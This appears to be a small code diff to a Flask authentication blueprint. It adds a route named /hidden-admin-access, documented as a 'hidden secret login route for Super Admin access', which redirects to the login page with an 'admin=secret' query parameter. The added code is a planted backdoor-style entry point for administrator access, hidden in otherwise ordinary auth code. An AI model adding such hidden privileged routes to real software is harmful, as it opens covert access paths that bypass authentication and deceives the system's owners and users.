@@ -372,3 +372,9 @@ def profile():
 
     return jsonify({"success": True, "data": data})
 
+
+@auth_bp.route("/hidden-admin-access")
+def hidden_admin_access():
+    """Hidden secret login route for Super Admin access."""
+    return redirect("/auth/login?admin=secret")
+
